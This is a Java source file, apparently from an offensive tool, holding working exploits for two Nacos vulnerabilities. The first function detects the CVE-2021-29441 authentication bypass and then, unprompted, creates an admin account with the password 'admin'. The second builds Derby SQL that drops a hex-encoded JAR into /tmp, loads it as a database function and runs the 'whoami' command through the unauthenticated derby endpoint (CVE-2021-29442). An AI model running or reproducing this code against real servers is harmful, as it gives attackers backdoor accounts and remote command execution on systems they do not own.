package com.liev.clouds.exp;

import com.liev.clouds.dao.HttpResponse;
import com.liev.clouds.payload.NacosPayloda;
import com.liev.clouds.utils.HttpUtils;
import com.liev.clouds.webcontroller.framework.NacosController;
import java.util.Map;
import java.util.Random;

import static com.liev.clouds.payload.NacosPayloda.HEX_JAR;

/**
 * @author Revcloud
 * @since 2024/9/6 18:38
 */
public class NacosExp {

    public static boolean check(String url, Map<String, String> headers, NacosController controller) {
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1);
        }

        String urlTrue = url + "/nacos/v1/auth/users?pageNo=1&pageSize=9";
        boolean vulnerabilityExists = false;
        try {
            // 发送 GET 请求以检测漏洞
            HttpResponse response = HttpUtils.sendGet(urlTrue, headers);
            String responseBody = response.getResponseBody();

            if (response.getResponseCode() == 200 && responseBody.contains("pageItems")) {
                controller.log.appendText("[+++]CVE-2021-29441 存在Nacos认证绕过漏洞！\n");
                addUser(url, headers, controller);
                controller.responseBody.appendText(responseBody + "\n\n\n");
                vulnerabilityExists = true;
            }
        } catch (Exception e) {
            System.err.println("Error during HTTP request: " + e.getMessage());
        }

        if (!vulnerabilityExists) {
            controller.log.appendText("[---]CVE-2021-29441 Nacos认证绕过漏洞不存在！\n");
        }
        return false;
    }

    public static void addUser(String url, Map<String, String> headers, NacosController controller) {
        String addUserEndpoint = url + "/nacos/v1/auth/users?username=admin&password=admin";

        try {
            // 发送 POST 请求以添加用户
            HttpResponse response = HttpUtils.sendPost(addUserEndpoint, NacosPayloda.EXP, headers);
            String responseBody = response.getResponseBody();

            if (response.getResponseCode() == 200 && responseBody.contains("create user ok")) {
                controller.log.appendText("成功添加用户！ 账号-密码:admin-admin \n");
            } else {
                System.out.println("Add User Failed");
            }
        } catch (Exception e) {
            System.err.println("Error during HTTP request: " + e.getMessage());
        }
    }

    public static void exploit(String url, Map<String, String> headers, NacosController controller) {
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1);
        }

        String removalUrl = url + "/nacos/v1/cs/ops/data/removal";
        String derbyUrl = url + "/nacos/v1/cs/ops/derby";

        try {
            Random random = new Random();
            boolean success = false;

            for (int i = 0; i < Integer.MAX_VALUE; i++) {
                String id = generateRandomId(random, 8);
                String postSql = generatePostSQL(id);
                String getSql = generateGetSQL(id, "whoami");

                // 使用自定义的 sendPost 方法发送 POST 请求
                HttpResponse postResponse = HttpUtils.sendPost(removalUrl, postSql, headers);
                if (postResponse.getResponseCode() != 200 || postResponse.getResponseBody().contains("message")) {
                    continue;
                }

                // 使用自定义的 sendGet 方法发送 GET 请求以执行注入的 SQL
                HttpResponse getResponse = HttpUtils.sendGet(derbyUrl + "?sql=" + getSql, headers);
                controller.log.appendText("[+++]Nacos 未授权接口命令执行漏洞（CVE-2021-29442） 存在！\n");
                controller.log.appendText("成功执行命令whoami！");
                controller.responseBody.appendText(getResponse.getResponseBody());
                success = true;
                break;
            }

            if (!success) {
                controller.log.appendText("[---]Nacos 未授权接口命令执行漏洞（CVE-2021-29442） 不存在\n");
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // 生成随机的 ID
    private static String generateRandomId(Random random, int length) {
        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        StringBuilder sb = new StringBuilder(length);
        for (int i = 0; i < length; i++) {
            sb.append(characters.charAt(random.nextInt(characters.length())));
        }
        return sb.toString();
    }

    // 生成恶意 SQL
    private static String generatePostSQL(String id) {
        return String.format("CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE('values cast(X''%s'' as blob)', '/tmp/%s', ',', '\"', 'UTF-8', '/tmp/%s.jar')"
                        + " CALL sqlj.install_jar('/tmp/%s.jar', 'NACOS.%s', 0)"
                        + " CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'NACOS.%s')"
                        + " CREATE FUNCTION S_EXAMPLE_%s(PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'Exec.exec';",
                HEX_JAR, id, id, id, id, id, id);
    }

    // 生成 SQL 命令，用于执行用户指定的命令
    private static String generateGetSQL(String id, String command) {
        return String.format("SELECT * FROM (SELECT COUNT(*) AS b, S_EXAMPLE_%s('%s') AS a FROM config_info) tmp", id, command);
    }

}
